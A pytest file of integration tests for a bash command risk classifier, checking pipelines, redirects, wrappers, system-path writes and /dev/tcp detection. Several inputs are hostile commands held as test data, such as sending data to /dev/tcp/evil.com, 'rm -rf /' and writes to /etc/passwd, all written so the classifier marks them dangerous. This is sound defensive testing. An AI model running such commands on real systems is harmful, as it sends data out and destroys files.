"""Tests for the classifier orchestrator (integration tests)."""

from __future__ import annotations

from pathlib import Path

import pytest

from bash_classify.classifier import _is_system_path, classify_expression, iter_invocations
from bash_classify.models import Classification, CommandDef, Risk


class TestSpecExamples:
    """Test the verbatim examples from SPEC.md."""

    def test_kubectl_pipeline(self, database: dict[str, CommandDef]) -> None:
        """kubectl --context=prod get pods -n kube-system | grep Running"""
        result = classify_expression(
            "kubectl --context=prod get pods -n kube-system | grep Running",
            database=database,
        )
        assert result.classification == Classification.READONLY
        assert len(result.commands) == 2

        kubectl_cmd = result.commands[0]
        assert kubectl_cmd.matched_rule == "kubectl.get"
        assert kubectl_cmd.classification == Classification.READONLY
        assert kubectl_cmd.ignored_options is not None
        assert "--context=prod" in kubectl_cmd.ignored_options

        grep_cmd = result.commands[1]
        assert grep_cmd.matched_rule == "grep"
        assert grep_cmd.classification == Classification.READONLY

    def test_find_xargs_rm(self, database: dict[str, CommandDef]) -> None:
        """find /tmp -name "*.log" | xargs -I {} rm {}"""
        result = classify_expression(
            'find /tmp -name "*.log" | xargs -I {} rm {}',
            database=database,
        )
        # xargs delegates to rm {} which is UNKNOWN (rm with {} arg, rm is DANGEROUS but
        # xargs base is UNKNOWN, inner rm is DANGEROUS... let's check)
        assert len(result.commands) == 2

        find_cmd = result.commands[0]
        assert find_cmd.matched_rule == "find"
        assert find_cmd.classification == Classification.READONLY
        assert "/tmp" in result.directories

        xargs_cmd = result.commands[1]
        assert xargs_cmd.matched_rule == "xargs"
        assert len(xargs_cmd.inner_commands) == 1
        inner = xargs_cmd.inner_commands[0]
        assert inner.delegation_mode == "rest_are_argv"

    def test_find_exec_rm(self, database: dict[str, CommandDef]) -> None:
        r"""find . -name "*.tmp" -exec rm -f {} \;"""
        result = classify_expression(
            'find . -name "*.tmp" -exec rm -f {} \\;',
            database=database,
        )
        assert result.classification == Classification.DANGEROUS

        assert len(result.commands) == 1
        find_cmd = result.commands[0]
        assert find_cmd.matched_rule == "find"
        assert find_cmd.classification == Classification.DANGEROUS
        assert len(find_cmd.inner_commands) == 1

        inner = find_cmd.inner_commands[0]
        assert inner.delegation_mode == "terminated_argv"
        assert inner.command == ["rm"]

    def test_find_exec_grep_is_readonly(self, database: dict[str, CommandDef]) -> None:
        r"""find -exec grep delegates classification to the inner command."""
        result = classify_expression(
            'find . -name "*.java" -exec grep -l "pattern" {} \\;',
            database=database,
        )
        assert result.classification == Classification.READONLY

        find_cmd = result.commands[0]
        assert find_cmd.classification == Classification.READONLY
        assert len(find_cmd.inner_commands) == 1
        assert find_cmd.inner_commands[0].command == ["grep"]
        assert find_cmd.inner_commands[0].classification == Classification.READONLY

    def test_kubectl_exec_cat(self, database: dict[str, CommandDef]) -> None:
        """kubectl exec -it my-pod -- cat /etc/config

        Inner cat is floored to EXTERNAL_EFFECTS by kubectl exec's
        min_classification, then the system-path elevation rule (touching
        /etc/config) escalates the whole expression to DANGEROUS.
        """
        result = classify_expression(
            "kubectl exec -it my-pod -- cat /etc/config",
            database=database,
        )
        assert result.classification == Classification.DANGEROUS

        kubectl_cmd = result.commands[0]
        assert kubectl_cmd.matched_rule == "kubectl.exec"
        assert kubectl_cmd.classification == Classification.DANGEROUS
        assert len(kubectl_cmd.inner_commands) == 1

        inner = kubectl_cmd.inner_commands[0]
        assert inner.delegation_mode == "after_separator"
        assert inner.command == ["cat"]
        # Inner is floored by min_classification: EXTERNAL_EFFECTS.
        assert inner.classification == Classification.EXTERNAL_EFFECTS

    def test_sh_c_expression(self, database: dict[str, CommandDef]) -> None:
        """sh -c "ls /tmp | grep log" """
        result = classify_expression(
            'sh -c "ls /tmp | grep log"',
            database=database,
        )
        # sh -c with only READONLY inner commands ignores the wrapper's
        # DANGEROUS base on successful delegation and ends up READONLY.
        assert result.classification == Classification.READONLY

        sh_cmd = result.commands[0]
        assert sh_cmd.matched_rule == "sh"
        assert sh_cmd.classification == Classification.READONLY
        assert len(sh_cmd.inner_commands) >= 2

        inner_cmds = {tuple(ic.command) for ic in sh_cmd.inner_commands}
        assert ("ls",) in inner_cmds
        assert ("grep",) in inner_cmds

        # Inner commands should be READONLY individually
        for ic in sh_cmd.inner_commands:
            assert ic.classification == Classification.READONLY


class TestCompositeClassification:
    def test_pipe_both_readonly(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("ls | grep pattern", database=database)
        assert result.classification == Classification.READONLY

    def test_pipe_readonly_and_dangerous(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("ls | rm file", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_unknown_trumps_readonly(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello && unknown_command", database=database)
        assert result.classification == Classification.UNKNOWN

    def test_semicolons_both_readonly(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat file; echo done", database=database)
        assert result.classification == Classification.READONLY


# Every spelling bash accepts for an output redirect: `>` or `>>`, each with an optional
# leading file descriptor and an optional `|` no-clobber override, plus `&>` and `&>>` for
# both streams and the `>&` that names a file rather than a descriptor. All of them write.
_WRITE_REDIRECTS = [">", ">>", ">|", "1>", "1>>", "1>|", "2>", "2>>", "3>", "4>>", "10>", "&>", "&>>", ">&"]
_READ_REDIRECTS = ["<", "1<", "3<"]
_DESCRIPTOR_DUPLICATIONS = ["2>&1", "1>&2", "3>&1", ">&2"]


class TestRedirectEffects:
    def test_output_redirect_elevates_to_write(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello > output.txt", database=database)
        assert result.classification == Classification.LOCAL_EFFECTS

    def test_devnull_redirect_no_elevation(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello > /dev/null", database=database)
        assert result.classification == Classification.READONLY

    def test_append_redirect_elevates_to_write(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello >> file.log", database=database)
        assert result.classification == Classification.LOCAL_EFFECTS

    def test_input_redirect_no_elevation(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat < input.txt", database=database)
        assert result.classification == Classification.READONLY

    def test_stderr_devnull_no_elevation(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cmd 2>/dev/null", database=database)
        # cmd is unknown, stderr to /dev/null shouldn't elevate
        # But cmd itself is unknown -> UNKNOWN
        # The redirect doesn't affect because target is /dev/null
        cmds = result.commands
        assert len(cmds) == 1
        # Check the redirect doesn't add EXTERNAL_EFFECTS on top
        # cmd is UNKNOWN, redirect to /dev/null doesn't affect
        for r in result.redirects:
            if r.target == "/dev/null":
                assert r.affects_classification is False

    @pytest.mark.parametrize("operator", _WRITE_REDIRECTS)
    def test_every_write_form_elevates_to_local_effects(self, operator: str, database: dict[str, CommandDef]) -> None:
        result = classify_expression(f"echo hello {operator} output.txt", database=database)
        assert result.classification == Classification.LOCAL_EFFECTS

    @pytest.mark.parametrize("operator", _WRITE_REDIRECTS)
    def test_no_write_form_elevates_when_it_discards(self, operator: str, database: dict[str, CommandDef]) -> None:
        result = classify_expression(f"echo hello {operator} /dev/null", database=database)
        assert result.classification == Classification.READONLY

    @pytest.mark.parametrize("operator", _READ_REDIRECTS)
    def test_no_read_form_elevates(self, operator: str, database: dict[str, CommandDef]) -> None:
        result = classify_expression(f"cat {operator} input.txt", database=database)
        assert result.classification == Classification.READONLY


class TestDirectoryDetection:
    def test_cd_directory(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cd /tmp && ls", database=database)
        assert "/tmp" in result.directories

    def test_find_directory(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression('find /var/log -name "*.log"', database=database)
        assert "/var/log" in result.directories

    def test_git_c_directory(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("git -C /some/repo status", database=database)
        assert "/some/repo" in result.directories


class TestDirectoryThroughAWrapper:
    """A `captures_directory` value has to be readable when a wrapper runs the command.

    The expression-level list does not collect it, so the per-invocation `directories` of
    the wrapped command is the only place it appears. Each case therefore pins both: the
    destination on the invocation, and the expression-level list left as it was.
    """

    WRAPPED = [
        ("sh -c 'tar -xf e.tar -C /home/u/.config'", "tar"),
        ("sudo tar -xf e.tar -C /home/u/.config", "tar"),
        ("env FOO=1 tar -xf e.tar -C /home/u/.config", "tar"),
        ("timeout 5 tar -xf e.tar -C /home/u/.config", "tar"),
        ("xargs tar -xf e.tar -C /home/u/.config", "tar"),
        ("find . -exec tar -xf e.tar -C /home/u/.config ;", "tar"),
        ("sh -c 'unzip e.zip -d /home/u/.config'", "unzip"),
        ("sudo unzip e.zip -d /home/u/.config", "unzip"),
        ("env FOO=1 unzip e.zip -d /home/u/.config", "unzip"),
        ("timeout 5 unzip e.zip -d /home/u/.config", "unzip"),
        ("xargs unzip e.zip -d /home/u/.config", "unzip"),
        ("find . -exec unzip e.zip -d /home/u/.config ;", "unzip"),
    ]

    @pytest.mark.parametrize(("expression", "binary"), WRAPPED)
    def test_the_destination_reaches_the_wrapped_invocation(
        self,
        expression: str,
        binary: str,
        database: dict[str, CommandDef],
    ) -> None:
        result = classify_expression(expression, database=database)
        destinations = [
            invocation.directories
            for invocation, via in iter_invocations(result)
            if via and invocation.command == [binary]
        ]
        assert destinations == [["/home/u/.config"]]

    @pytest.mark.parametrize(("expression", "binary"), WRAPPED)
    def test_the_expression_level_list_does_not_collect_it(
        self,
        expression: str,
        binary: str,
        database: dict[str, CommandDef],
    ) -> None:
        """Pinned because not aggregating is the decision, not an oversight."""
        result = classify_expression(expression, database=database)
        expected = ["."] if expression.startswith("find ") else []
        assert result.directories == expected

    def test_a_destination_two_wrappers_deep_still_reaches(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("sudo sh -c 'tar -xf e.tar -C /home/u/.config'", database=database)
        reached = [
            (via, invocation.directories) for invocation, via in iter_invocations(result) if invocation.directories
        ]
        assert reached == [(["sudo", "sh"], ["/home/u/.config"])]
        assert result.directories == []

    def test_a_wrapper_does_not_borrow_the_destination_below_it(self, database: dict[str, CommandDef]) -> None:
        """`sh` names no directory of its own, so its own list stays empty."""
        result = classify_expression("sudo sh -c 'tar -xf e.tar -C /home/u/.config'", database=database)
        sh = next(invocation for invocation, _ in iter_invocations(result) if invocation.command == ["sh"])
        assert sh.directories is None

    def test_a_positional_directory_below_a_wrapper_is_not_captured(self, database: dict[str, CommandDef]) -> None:
        """`ls /tmp` names its directory as a positional, which no option captures."""
        result = classify_expression("sudo ls /tmp", database=database)
        ls = next(invocation for invocation, _ in iter_invocations(result) if invocation.command == ["ls"])
        assert ls.directories is None
        assert result.directories == ["/tmp"]

    def test_an_unwrapped_invocation_is_untouched(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("tar -xf e.tar -C /home/u/.config", database=database)
        assert result.directories == ["/home/u/.config"]
        assert result.commands[0].directories == ["/home/u/.config"]
        assert result.commands[0].inner_commands == []


class TestCatDirectoryDetection:
    def test_cat_extracts_dirname(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat /etc/config", database=database)
        assert "/etc" in result.directories

    def test_cat_no_slash_no_directory(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat file.txt", database=database)
        assert result.directories == []

    def test_cat_nested_path(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat /var/log/syslog", database=database)
        assert "/var/log" in result.directories


class TestBackgrounding:
    def test_background_elevates_to_write(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello &", database=database)
        # echo is READONLY, backgrounding elevates to LOCAL_EFFECTS
        assert result.classification == Classification.LOCAL_EFFECTS


class TestEdgeCases:
    def test_empty_string(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("", database=database)
        assert result.classification == Classification.READONLY
        assert result.commands == []

    def test_comment_only(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("# just a comment", database=database)
        assert result.classification == Classification.READONLY
        assert result.commands == []

    def test_complex_nested_delegation_chain(self, database: dict[str, CommandDef]) -> None:
        """FOO=bar sudo env PATH=/usr/bin sh -c "kubectl --context=prod get pods | grep Running" """
        result = classify_expression(
            'FOO=bar sudo env PATH=/usr/bin sh -c "kubectl --context=prod get pods | grep Running"',
            database=database,
        )
        # This should handle the nested delegation chain:
        # FOO=bar is a prefix assignment (stripped)
        # sudo delegates to env ...
        # env strips PATH=/usr/bin, delegates to sh ...
        # sh -c parses the expression recursively
        assert result.classification == Classification.DANGEROUS
        assert len(result.commands) >= 1


class TestVariableInCommandPosition:
    def test_variable_command(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("$CMD arg1 arg2", database=database)
        assert result.classification == Classification.DANGEROUS
        # The command with variable in position should be DANGEROUS
        cmd = result.commands[0]
        assert cmd.classification == Classification.DANGEROUS
        assert cmd.classification_reason == "variable expansion in command position"


class TestAutoLoadDatabase:
    def test_classify_without_database_arg(self) -> None:
        """classify_expression should auto-load the database when not provided."""
        result = classify_expression("ls /tmp")
        assert result.classification == Classification.READONLY
        assert len(result.commands) >= 1


class TestLsDirectoryDetection:
    def test_ls_directory(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("ls /tmp", database=database)
        assert "/tmp" in result.directories


class TestHeadDirectoryDetection:
    def test_head_directory(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("head /var/log/syslog", database=database)
        assert "/var/log" in result.directories


class TestBackgroundOnReadonly:
    def test_background_elevates_readonly_to_write(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello &", database=database)
        cmd = result.commands[0]
        assert cmd.classification == Classification.LOCAL_EFFECTS


class TestInputRedirectNoElevation:
    def test_input_redirect_no_elevation(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat < file.txt", database=database)
        assert result.classification == Classification.READONLY


class TestDevNullRedirectNoElevation:
    def test_devnull_redirect_no_elevation(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello > /dev/null", database=database)
        assert result.classification == Classification.READONLY


class TestHeredocHerestring:
    def test_heredoc_no_elevation(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat <<EOF\nhello\nEOF", database=database)
        assert result.classification == Classification.READONLY

    def test_herestring_no_elevation(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat <<< hello", database=database)
        assert result.classification == Classification.READONLY


class TestMultipleMixedCommands:
    def test_echo_redirect_then_cat(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello > file; cat file", database=database)
        assert result.classification == Classification.LOCAL_EFFECTS


class TestNegativeReadonlyNotWrite:
    def test_cat_file_not_write(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat file", database=database)
        assert result.classification != Classification.EXTERNAL_EFFECTS

    def test_cat_file_is_readonly(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat file", database=database)
        assert result.classification == Classification.READONLY


class TestNegativeUnknownCommand:
    def test_unknown_command_is_exactly_unknown(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("randomcmd123", database=database)
        assert result.classification == Classification.UNKNOWN


class TestNegativeForceWithLease:
    def test_force_with_lease_not_dangerous(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("git push --force-with-lease", database=database)
        assert result.classification != Classification.DANGEROUS
        assert result.classification == Classification.EXTERNAL_EFFECTS


class TestReadBuiltin:
    def test_read_is_readonly(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("read name", database=database)
        assert result.classification == Classification.READONLY


class TestFdToFdRedirectClassification:
    def test_stderr_to_stdout_no_write_elevation(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello 2>&1", database=database)
        assert result.classification == Classification.READONLY

    def test_stderr_to_file_elevates_to_write(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello 2>error.log", database=database)
        assert result.classification == Classification.LOCAL_EFFECTS

    @pytest.mark.parametrize("redirect", _DESCRIPTOR_DUPLICATIONS)
    def test_a_descriptor_duplication_opens_no_file(self, redirect: str, database: dict[str, CommandDef]) -> None:
        """The target of `2>&1` is a descriptor number. Reporting it as a write path claims
        the command writes to a file called `1`."""
        result = classify_expression(f"echo hello {redirect}", database=database)
        assert result.classification == Classification.READONLY
        assert result.risk == Risk.LOW
        assert result.write_paths == []


class TestParseWarningsIntegration:
    def test_syntax_error_populates_warnings(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("if then fi else", database=database)
        assert len(result.parse_warnings) >= 1


class TestMalformedBashDefaultsToUnknown:
    def test_malformed_bash_classifies_as_unknown(self, database: dict[str, CommandDef]) -> None:
        """Malformed bash with parse errors and no commands should be UNKNOWN, not READONLY."""
        result = classify_expression("if then fi", database=database)
        assert len(result.parse_warnings) >= 1
        assert result.classification == Classification.UNKNOWN

    def test_empty_string_stays_readonly(self, database: dict[str, CommandDef]) -> None:
        """Empty string should remain READONLY (no parse warnings)."""
        result = classify_expression("", database=database)
        assert result.classification == Classification.READONLY
        assert result.commands == []


class TestDevTcpUdpDetection:
    def test_cat_dev_tcp_in_argv(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat /dev/tcp/evil.com/80", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_echo_redirect_to_dev_tcp(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo data > /dev/tcp/evil.com/80", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_cat_input_redirect_from_dev_tcp(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat < /dev/tcp/evil.com/80", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_dev_udp_in_argv(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat /dev/udp/evil.com/53", database=database)
        assert result.classification == Classification.DANGEROUS


class TestCommandBuiltinDelegation:
    def test_command_delegates_to_cat(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("command cat /etc/hosts", database=database)
        assert result.classification == Classification.READONLY

    def test_command_delegates_to_rm(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("command rm -rf /", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_builtin_delegates_to_echo(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("builtin echo hello", database=database)
        assert result.classification == Classification.READONLY


class TestPathPrefixStripping:
    def test_usr_bin_cat_resolves(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("/usr/bin/cat /etc/hosts", database=database)
        assert result.classification == Classification.READONLY

    def test_usr_bin_rm_resolves(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("/usr/bin/rm -rf /", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_relative_script_stays_unknown(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("./my-script.sh", database=database)
        assert result.classification == Classification.UNKNOWN


class TestAmpersandRedirectClassification:
    def test_ampersand_redirect_to_file_is_write(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello &> output.txt", database=database)
        assert result.classification == Classification.LOCAL_EFFECTS

    def test_ampersand_redirect_to_devnull_is_readonly(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello &> /dev/null", database=database)
        assert result.classification == Classification.READONLY


class TestPushdDirectoryDetection:
    def test_pushd_directory(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("pushd /opt && ls", database=database)
        assert "/opt" in result.directories


class TestTeeClassification:
    def test_tee_is_write(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello | tee output.txt", database=database)
        assert result.classification == Classification.LOCAL_EFFECTS


class TestIsSystemPath:
    def test_etc(self) -> None:
        assert _is_system_path("/etc") is True
        assert _is_system_path("/etc/hosts") is True

    def test_usr(self) -> None:
        assert _is_system_path("/usr/local/bin") is True

    def test_tmp_safe(self) -> None:
        assert _is_system_path("/tmp") is False
        assert _is_system_path("/tmp/foo") is False

    def test_home_safe(self) -> None:
        assert _is_system_path("/home/user") is False

    def test_var_tmp_safe(self) -> None:
        assert _is_system_path("/var/tmp") is False
        assert _is_system_path("/var/tmp/test") is False

    def test_var_log_system(self) -> None:
        assert _is_system_path("/var/log") is True

    def test_dev_null_safe(self) -> None:
        assert _is_system_path("/dev/null") is False

    def test_dev_sda_system(self) -> None:
        assert _is_system_path("/dev/sda") is True

    def test_relative_path(self) -> None:
        assert _is_system_path("etc/hosts") is False
        assert _is_system_path("./usr/bin") is False

    def test_boot(self) -> None:
        assert _is_system_path("/boot/vmlinuz") is True

    def test_proc(self) -> None:
        assert _is_system_path("/proc/1/status") is True


class TestSystemDirectoryClassification:
    def test_write_to_etc_is_dangerous(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cp config.txt /etc/myapp/config", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_write_to_usr_is_dangerous(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cp binary /usr/local/bin/mybinary", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_read_from_etc_is_readonly(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat /etc/hosts", database=database)
        assert result.classification == Classification.READONLY

    def test_read_from_usr_is_readonly(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("ls /usr/local/bin", database=database)
        assert result.classification == Classification.READONLY

    def test_write_to_tmp_not_elevated(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cp file /tmp/backup", database=database)
        assert result.classification == Classification.LOCAL_EFFECTS

    def test_write_to_home_not_elevated(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cp file /home/user/backup", database=database)
        assert result.classification == Classification.LOCAL_EFFECTS

    def test_write_to_var_tmp_not_elevated(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cp file /var/tmp/backup", database=database)
        assert result.classification == Classification.LOCAL_EFFECTS

    def test_write_to_var_log_is_dangerous(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cp file /var/log/myapp.log", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_redirect_to_etc_is_dangerous(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo config > /etc/myapp.conf", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_redirect_to_tmp_not_elevated(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello > /tmp/test.txt", database=database)
        assert result.classification == Classification.LOCAL_EFFECTS

    def test_mkdir_in_etc_is_dangerous(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("mkdir /etc/myapp", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_touch_in_opt_is_dangerous(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("touch /opt/myapp/config", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_chmod_in_usr_is_dangerous(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("chmod 755 /usr/local/bin/script.sh", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_rm_is_already_dangerous(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("rm /etc/config", database=database)
        assert result.classification == Classification.DANGEROUS

    def test_dev_null_safe(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello > /dev/null", database=database)
        assert result.classification == Classification.READONLY

    def test_relative_path_not_elevated(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cp file ./etc/config", database=database)
        assert result.classification == Classification.LOCAL_EFFECTS

    def test_git_commit_with_system_path_message_not_elevated(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression('git commit -m "fix /etc/config"', database=database)
        # -m takes_value, so "fix /etc/config" is consumed as -m's value
        # The token "fix /etc/config" doesn't start with /, so it won't trigger
        assert result.classification == Classification.LOCAL_EFFECTS


class TestUserCommandOverride:
    def test_custom_command_classifies_correctly(self, tmp_path: object) -> None:
        """End-to-end: user-defined command is used in classification."""
        from pathlib import Path

        assert isinstance(tmp_path, Path)
        user_dir = tmp_path / "config" / "commands"
        user_dir.mkdir(parents=True)
        (user_dir / "mycli.yaml").write_text("command: mycli\nclassification: READONLY\nstrict: false\n")

        import os

        old = os.environ.get("BASH_CLASSIFY_CONFIG_DIR")
        try:
            os.environ["BASH_CLASSIFY_CONFIG_DIR"] = str(tmp_path / "config")
            result = classify_expression("mycli query --format json")
            assert result.classification == Classification.READONLY
        finally:
            if old is None:
                os.environ.pop("BASH_CLASSIFY_CONFIG_DIR", None)
            else:
                os.environ["BASH_CLASSIFY_CONFIG_DIR"] = old


class TestRiskSystemPathElevation:
    def test_write_to_system_path_high_risk(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cp config.txt /etc/myapp/config", database=database)
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH

    def test_redirect_to_system_path_high_risk(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo config > /etc/myapp.conf", database=database)
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH

    @pytest.mark.parametrize("operator", _WRITE_REDIRECTS)
    def test_a_system_path_is_dangerous_in_every_write_form(
        self, operator: str, database: dict[str, CommandDef]
    ) -> None:
        result = classify_expression(f"echo config {operator} /etc/myapp.conf", database=database)
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH


class TestProgramWordIsNotASystemPathWrite:
    """Running a binary by absolute path is not a write into the directory it lives in."""

    @pytest.mark.parametrize(
        "expression",
        [
            "/usr/bin/git add a.txt",
            "/usr/local/bin/git add a.txt",
            "/opt/tools/git add a.txt",
        ],
    )
    def test_an_absolute_program_path_classifies_as_the_bare_spelling(
        self, expression: str, database: dict[str, CommandDef]
    ) -> None:
        result = classify_expression(expression, database=database)
        bare = classify_expression("git add a.txt", database=database)
        assert (result.classification, result.risk) == (bare.classification, bare.risk)
        assert result.classification == Classification.LOCAL_EFFECTS
        assert result.risk == Risk.LOW

    @pytest.mark.parametrize(
        ("absolute", "bare"),
        [
            ("env /usr/bin/git add a.txt", "env git add a.txt"),
            ("timeout 5 /usr/bin/git add a.txt", "timeout 5 git add a.txt"),
            ("xargs /bin/cp", "xargs cp"),
            ("sh -c '/usr/bin/git add a.txt'", "sh -c 'git add a.txt'"),
            ("find . -exec /bin/cp {} dst/ ;", "find . -exec cp {} dst/ ;"),
        ],
    )
    def test_a_wrapped_program_path_classifies_as_the_bare_spelling(
        self, absolute: str, bare: str, database: dict[str, CommandDef]
    ) -> None:
        """Every wrapper here leaves the verdict to the command it runs, so the rows are real controls."""
        wrapped = classify_expression(absolute, database=database)
        plain = classify_expression(bare, database=database)
        assert (wrapped.classification, wrapped.risk) == (plain.classification, plain.risk)

    @pytest.mark.parametrize(
        ("absolute", "bare"),
        [
            ("sudo /usr/bin/git add a.txt", "sudo git add a.txt"),
            ("sudo sh -c '/usr/bin/git add a.txt'", "sudo sh -c 'git add a.txt'"),
            ("eval '/usr/bin/git add a.txt'", "eval 'git add a.txt'"),
        ],
    )
    def test_a_floored_wrapper_gives_both_spellings_the_same_verdict(
        self, absolute: str, bare: str, database: dict[str, CommandDef]
    ) -> None:
        """A documentation row, not a control.

        `sudo` and `eval` are DANGEROUS/HIGH whatever they run, so both spellings agree here
        no matter what the system-path elevation does. The row records the shape; the rows
        above are what actually pin the behaviour.
        """
        wrapped = classify_expression(absolute, database=database)
        plain = classify_expression(bare, database=database)
        assert (wrapped.classification, wrapped.risk) == (plain.classification, plain.risk)

    @pytest.mark.parametrize(
        ("expression", "classification", "risk"),
        [
            ("env /usr/bin/git add a.txt", Classification.LOCAL_EFFECTS, Risk.LOW),
            ("timeout 5 /usr/bin/git add a.txt", Classification.LOCAL_EFFECTS, Risk.LOW),
            ("xargs /bin/cp", Classification.LOCAL_EFFECTS, Risk.MEDIUM),
            ("sh -c '/usr/bin/git add a.txt'", Classification.LOCAL_EFFECTS, Risk.LOW),
        ],
    )
    def test_the_wrapped_verdicts_are_what_they_should_be(
        self, expression: str, classification: Classification, risk: Risk, database: dict[str, CommandDef]
    ) -> None:
        """Pin the wrapped verdicts too, so a bare spelling that regresses the same way still fails."""
        result = classify_expression(expression, database=database)
        assert result.classification == classification
        assert result.risk == risk

    def test_an_absolute_readonly_program_path_stays_readonly(self, database: dict[str, CommandDef]) -> None:
        """A documentation row, not a control.

        `READONLY` sits below the guard the elevation runs behind, so this row could not fail
        in any version of the rule -- it records why the bug was easy to miss, not coverage.
        """
        result = classify_expression("/usr/bin/git status", database=database)
        bare = classify_expression("git status", database=database)
        assert (result.classification, result.risk) == (bare.classification, bare.risk)
        assert result.classification == Classification.READONLY
        assert result.risk == Risk.LOW

    def test_an_absolute_path_to_a_dangerous_program_is_still_dangerous(self, database: dict[str, CommandDef]) -> None:
        """`rm` earns DANGEROUS from its own definition, not from the system-path elevation."""
        result = classify_expression("/usr/bin/rm f", database=database)
        bare = classify_expression("rm f", database=database)
        assert (result.classification, result.risk) == (bare.classification, bare.risk)
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH


class TestSystemPathsInsideAScript:
    """A script handed to a shell gets the verdict its commands would get on their own."""

    @pytest.mark.parametrize(
        "expression",
        [
            "sh -c '/usr/bin/touch /etc/passwd'",
            "bash -c '/usr/bin/touch /etc/newfile'",
            "sh -c '/bin/mkdir -p /usr/lib/x'",
            "timeout 5 sh -c '/usr/bin/mkdir /usr/lib/x'",
            "sh -c '/usr/bin/cp a /usr/bin/b'",
            "timeout 5 sh -c '/bin/touch /etc/passwd'",
            "sh -c 'mkdir -p /usr/lib/x'",
            "sh -c 'touch /etc/newfile'",
        ],
    )
    def test_a_write_into_a_system_directory_inside_a_script_is_dangerous(
        self, expression: str, database: dict[str, CommandDef]
    ) -> None:
        """These pin the script scan, but not all of them against the same thing.

        The rows whose script begins with an absolute system path also pass on master, which
        caught them by accident -- the whole script token read as a path under `/usr` or
        `/bin`. What they are a control against is the first shape of this commit, which
        skipped the script token and scanned nothing in its place and turned them
        `LOCAL_EFFECTS`/`LOW`, the hook's auto-approve condition. The last two rows begin with
        a bare command and fail on master as well, so the class is not written entirely
        against one revision.
        """
        result = classify_expression(expression, database=database)
